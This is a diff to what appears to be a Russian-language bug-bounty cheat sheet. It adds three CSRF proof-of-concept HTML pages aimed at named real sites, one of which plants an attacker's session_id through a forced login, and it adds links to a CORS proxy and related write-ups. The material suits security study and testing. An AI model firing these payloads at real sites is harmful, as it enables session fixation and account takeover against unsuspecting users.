@@ -837,6 +837,43 @@ CSRF to XSS
     </form>
   </body>
 </html>
+
+Еще пример:
+<!doctype html>
+<html>
+    <head>
+    </head> 
+<body>
+    <script>
+        var a = window.open("https://app.mavenlink.com/project_templates#new", "csrf", "height=100,width=100"); 
+        var intervalID = setTimeout(function () { a.close();}, 30000); 
+    </script>
+</body>
+</html>
+
+Еще пример:(Все конечные точки API (v1 и v2) отражают session_id для ответа Set-Cookie - что может привести жертву к учетной записи злоумышленника)
+<!doctype html>
+<html>
+    <head>
+    </head> 
+<body>
+    <form action="https://unikrn.com/apiv1/" method="POST">
+        <input type="hidden" name="session_id" id="session_id" value="cm8csktf7p485hmb7on32o5bm94nm71i"> <!-- attacker session_id -->
+        <input type="submit"">
+    </form>
+</body>
+</html>
+
+Еще пример: Create a CSRF login POC using the following code.
+<html>
+<body>
+    <form action="https://unikrn.com/apiv1/login" method="POST">
+        <input type="hidden" name="usr" value="[email]">
+        <input type="hidden" name="pwd" value="[password]">
+        <input type="submit" value="Submit request" />
+    </form>
+</body>
+</html>
 ```
 
 **SSRF - Server side request forgery**
@@ -1022,6 +1059,15 @@ https://github.com/kurobeats/pentest-bookmarks/blob/master/BookmarksList.md
 
 Bugcrowd_university
 https://github.com/bugcrowd/bugcrowd_university
+
+This API enables cross-origin requests to anywhere.
+https://cors-anywhere.herokuapp.com/
+https://hackerone.com/reports/577920
+
+Hacking It Out: When CORS won’t let you be great
+https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646
+
+
 ```
 
 **Wordlist**
